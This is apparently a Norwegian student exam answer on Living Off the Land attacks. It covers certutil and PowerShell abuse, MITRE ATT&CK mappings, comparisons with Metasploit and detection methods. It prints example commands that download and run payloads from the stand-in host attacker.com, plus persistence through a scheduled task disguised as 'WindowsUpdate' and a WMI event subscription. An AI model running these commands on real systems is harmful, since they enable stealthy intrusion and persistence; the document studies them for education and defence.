# 🏕️ ETH2100 – Living Off the Land (LOtL)

> **Karakter:** A | ETH2100 Kontinuasjonseksamen – Oppgave 3  
> **Verktøy:** certutil.exe, PowerShell  
> **MITRE ATT&CK:** T1218 (certutil), T1059.001 (PowerShell)

---

## Hva er Living Off the Land?

Living Off the Land (LOtL) er en angrepsteknikk der trusselaktører utnytter legitime verktøy og binærfiler som allerede er installert på målsystemet – fremfor å introdusere egen malware. Begrepet ble introdusert av Christopher Campbell og Matt Graeber under DerbyCon 3.

**Komponenter:**
- **LOLBins** – Living Off the Land Binaries (200+ dokumentert av LOLBAS-prosjektet)
- **LOLScripts** – legitime skript misbrukt til ondsinnede formål
- **LOLLibs** – legitime biblioteker

Kjernen er strategisk misbruk av eksisterende funksjonalitet for å **redusere deteksjonsavtrykk** og omgå signaturbasert sikkerhet.

---

## Hvorfor er LOtL viktig?

Tradisjonell endepunktssikkerhet baseres på signaturer og kjente hash-verdier. Når angriperen benytter Microsoft-signerte verktøy som `certutil.exe` eller PowerShell – komponenter som inngår i normal administrativ drift – utfordres sikkerhetsproduktenes evne til å skille mellom legitim og ondsinnet aktivitet.

Avanserte aktører som **APT29 (Cozy Bear)** har benyttet LOLBins som en sentral del av sine operasjoner (MITRE ATT&CK).

---

## Eksempel 1: certutil.exe

### Hva det er
`certutil.exe` er et innebygd Windows-verktøy for sertifikatadministrasjon, men kan også:
- Hente innhold over HTTP/HTTPS (URL-basert caching)
- Kode og dekode base64

### LOtL-bruk
```cmd
# Last ned payload via HTTP (ser ut som legitim sertifikathenting):
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\update.exe

# Dekode base64-encoded payload:
certutil -decode encoded.b64 payload.exe
```

### Sammenligning med Metasploit (Parasram et al., 2018)
| | certutil | msfvenom/Metasploit |
|---|---|---|
| Deteksjonsavtrykk | Lavt – Microsoft-signert binær | Høyt – velkjente payload-strukturer |
| EDR-risiko | Kontekstuell analyse kreves | Ofte blokkert av moderne EDR |
| Fleksibilitet | Manuell styring | Automatisert og kraftig |

**MITRE ATT&CK:** `T1218` – Signed Binary Proxy Execution

---

## Eksempel 2: PowerShell

### Hva det er
PowerShell er en integrert administrasjonsplattform med direkte tilgang til .NET, WMI, Windows-registeret og nettverksressurser.

### LOtL-bruk
```powershell
# In-memory execution (ingen filer på disk):
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Vedvarende tilgang via planlagt oppgave:
schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "powershell -enc <base64>"

# WMI-abonnement for persistens:
$filter = Set-WMIInstance -Namespace root\subscription -Class __EventFilter ...
```

### Sammenligning med Meterpreter (Parasram et al., s. 335–340)
| | PowerShell LOtL | Meterpreter |
|---|---|---|
| Privilegieeskalering | Identifiserer feilkonfigurerte tjenester | `getsystem` – automatisert |
| Vedvarende tilgang | WMI, registry, planlagte oppgaver | `persistence` – automatisert |
| Deteksjonsavtrykk | Lav – del av systemets administrasjon | Høy – kjente payload-strukturer |

**MITRE ATT&CK:** `T1059.001` – Command and Scripting Interpreter: PowerShell

---

## Drøfting

### LOtL ≠ usynlighet
Deteksjon er mulig via:
- **PowerShell Script Block Logging** (Event ID 4104)
- **Kommandolinje-logging** via Sysmon
- **Atferdsbasert analyse** – avvikende bruk av administrative verktøy

### Effektivitet vs. sikkerhetsmodenhet

| Organisasjonens modenhet | LOtL-effektivitet |
|---|---|
| Lav (begrenset logging) | Svært effektiv – ingen synlige artefakter |
| Høy (SIEM + baseline + EDR) | Kan detekteres via kontekstuell analyse |

### Plassering i Cyber Kill Chain

LOtL opererer primært i:
- **Exploitation** – initial kodekjøring
- **Installation** – vedvarende tilgang uten disk-artefakter
- **Command & Control** – kryptert kommunikasjon via legitime kanaler

---

## Konklusjon

En penetrasjonstest som utelukkende baserer seg på Metasploit tester primært evnen til å oppdage kjente signaturer – ikke motstandsdyktigheten mot realistiske trusselaktører. LOtL representerer et skifte i angrepsfilosofi: fra verktøybasert kompromittering til **kontekstuell og atferdsbasert omgåelse av deteksjon**.

---

## Referanser

| Kilde | Detalj |
|-------|--------|
| Hutchins et al. (2011) | Intelligence-driven computer network defense. Lockheed Martin |
| LOLBAS Project (u.å.) | https://lolbas-project.github.io/ |
| MITRE ATT&CK | T1059.001 – https://attack.mitre.org/techniques/T1059/001/ |
| MITRE ATT&CK | T1218 – https://attack.mitre.org/techniques/T1218/ |
| Moe, O. (2018) | #LOLBins – Nothing to LOL about! DerbyCon 2018 |
| Parasram et al. (2018) | Kali Linux 2018. Packt Publishing |
| Østby, B. (u.å.) | Forelesning 21: Post exploitation and persistence. Høyskolen Kristiania |
